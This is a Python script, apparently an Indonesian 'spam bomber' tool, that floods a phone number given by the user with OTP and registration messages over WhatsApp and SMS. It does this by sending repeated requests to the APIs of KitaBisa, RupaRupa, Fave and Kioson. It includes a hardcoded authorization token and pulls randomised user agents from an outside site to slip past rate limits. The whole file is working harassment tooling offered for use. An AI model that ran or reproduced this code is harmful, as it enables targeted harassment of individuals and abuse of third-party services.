import requests, json, mechanize, os, sys, time, re
from bs4 import BeautifulSoup as bs

if sys.platform in ['nt','win32']:
	os.system('cls')
	W = ''
	R = ''
	G = ''
	Y = ''
	B = ''
	L = ''
	C = ''
else:
	os.system('clear')
	W = '\033[97m'
	R = '\033[91m'
	G = '\033[92m'
	Y = '\033[93m'
	B = '\033[94m'
	L = '\033[95m'
	C = '\033[96m'
	N = '\033[0m'

def warning(d):
	print ("{}   WARNING{}, {}".format(R, W, d))

def ua():
	r = requests.get("https://api.svrsc.xyz/uagen.php")
	j = json.loads(r.text)['ua']
	return j

class KitaBisa:
	def __init__(self, target):
		self.hulu = {
			'Host':'core.ktbs.io',
			'accept':'application/json',
			'content-type':'application/x-www-form-urlencoded',
			'user-agent':ua(),
			'version':'3.4.0',
			'origin':'https://kitabisa.com',
			'sec-fetch-site':'cross-site',
			'sec-fetch-mode':'cors',
			'referer':'https://kitabisa.com/register',
			'accept-encoding':'gzip, deflate, br',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		}
		self.data = {
			'full_name':'MicroDragon',
 			'user_id':target,
			'user_id_type':'phone_number'
                }
	def spam(self):
		r = requests.post("https://core.ktbs.io/v2/user/registration/temp", headers=self.hulu, json=self.data)
		j = json.loads(r.text)
		try:
			if j["data"]:
				print ("{}[{}OK{}] Success {}".format(C, G, C, N))
		except KeyError:
			print ("{}[{}FL{}] Failed{}".format(C, R, C, N))

class RupaRupa:
	def __init__(self, target):
		self.header = {
			'Host':'wapi.ruparupa.com',
			'authorization':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiMDFmMTYyNTEtMzM0Ni00MmRiLWI0MDItODMxY2FmNjA2ZjljIiwiaWF0IjoxNTgxMDA3NTg0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.vJ7uUcys74Ju8CnM692kQBxUgJMKfGd2rIyGivOnvxM',
			'content-type':'application/json',
			'x-company-name':'odi',
			'accept':'application/json',
			'user-agent':ua(),
			'user-platform':'mobile',
			'x-frontend-type':'mobile',
			'origin':'https://m.ruparupa.com',
			'sec-fetch-site':'same-site',
			'sec-fetch-mode':'cors',
 			'referer':'https://m.ruparupa.com/verification?page=otp-choices',
			'accept-encoding':'gzip, deflate, br',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		self.data = {
				"phone":target,
				"action":"register",
				"channel":"chat",
				"email":"",
				"customer_id":"0",
				"is_resend":'0'
		}

	def spam(self):
		r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", headers=self.header, json=self.data)
		j = json.loads(r.text)
		if "success" in j['message']:
			print ("{}[{}OK{}] Success {}".format(C, G, C, N))
		elif "tunggu" in j['message']:
			print ("{}[{}WRN{}] Warning: {}{}".format(C, Y, C, j['message'], N))
		else:
			print ("{}[{}FL{}] Failed{}".format(C, R, C, N))

class Fave:
	def __init__(self, target):
		self.data = {
			"phone":target
		}

	def spam(self):
		r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=self.data)
		if r.status_code != 200:
			print (r.text)
			print ("{}[{}OK{}] Success {}".format(C, G, C, N))
		else:
			print (r.text)
			print ("{}[{}FL{}] Failed{}".format(C, R, C, N))

class Kios:
	def __init__(self, target):
		self.header = {
			'Content-Type':'application/json',
			'Host':'kiosondev.app.narindo.com',
			'Connection':'Keep-Alive',
			'Accept-Encoding':'gzip',
			'User-Agent':'okhttp/3.8.0'
		}
		self.data = {
				'appType':'KIOSON',
				'msisdn':target
		}

	def spam(self):
		r = requests.post('https://kiosondev.app.narindo.com/api/v1/otp', headers=self.header, json=self.data)
		j = json.loads(r.text)
		if "success" in j["msg"]:
			print ("{}[{}OK{}] Success {}".format(C, G, C, N))
		else:
			print (j.text)

def banner():
	print ("""{}
   (          )              )  
   )\ )    ( /(           ( /(  
  (()/(    )\())  (   (   )\()) 
   /(_))_ ((_)\   )\  )\ (_))/  
  (_)) __|| |(_) ((_)((_)| |_ {}
    | (_ || ' \ / _ \(_-<|  _|  
     \___||_||_|\___//__/ \__|  
{} BILLAL | CYBER GHOST INDONESIAN
""".format(R,W, C))

def main():
	print ("{}   [{}1{}].Spam WhatsApp {}(KitaBisa.com)".format(W,L,W,B))
	print ("{}   [{}2{}].Spam WhatsApp {}(RUPA-RUPA)".format(W,L,W,B))
	print ("{}   [{}3{}].Spam SMS {}(kioson)".format(W,L,W,B))
	print ("{}   [{}4{}].Spam SMS {}(fave)".format(W,L,W,B))
	try:
		p = input("\n{}[{}CHOICE{}]: {}".format(L,B,L,G))
		if p == "1" or p == "01":
			warning(" Delay 60 Seconds")
			no = input("{}TARGET: {}".format(C, G))
			jml = int(input("{}TOTAL: {}".format(C, G)))
			s = KitaBisa(no)
			for a in range(1, jml):
				s.spam()
				time.sleep(60)
		elif p == "2" or p == "02":
			no = input("{}TARGET: {}".format(C, G))
			jml = int(input("{}TOTAL: {}".format(C, G)))
			s = RupaRupa(no)
			for a in range(1, jml):
				s.spam()
		elif p == "3" or p == "03":
			no = input("{}TARGET: {}".format(C, G))
			jml = int(input("{}TOTAL: {}".format(C, G)))
			s = Kios(no)
			for a in range(1, jml):
				s.spam()
		elif p == "4" or p == "04":
			warning("Please use +628xxxx")
			no = input("{}TARGET: {}".format(C, G))
			jml = int(input("{}TOTAL: {}".format(C, G)))
			s = Fave(no)
			for a in range(1, jml):
				s.spam()
				time.sleep(2)

	except ValueError:
		print ("{}[ERROR]> please input number".format(R))

try:
	banner()
	main()
except KeyboardInterrupt:
	print ("{}[{}•{}] EXIT? ok{}".format(W, G, W, N))
except EOFError:
	print ("\n{}[{}•{}] EXIT? ok{}".format(W, G, W, N))
except requests.exceptions.ConnectionError:
	print ("{}[{}×{}] {}Failed Connect, please check your signal{}".format(C, R, C, R, N))
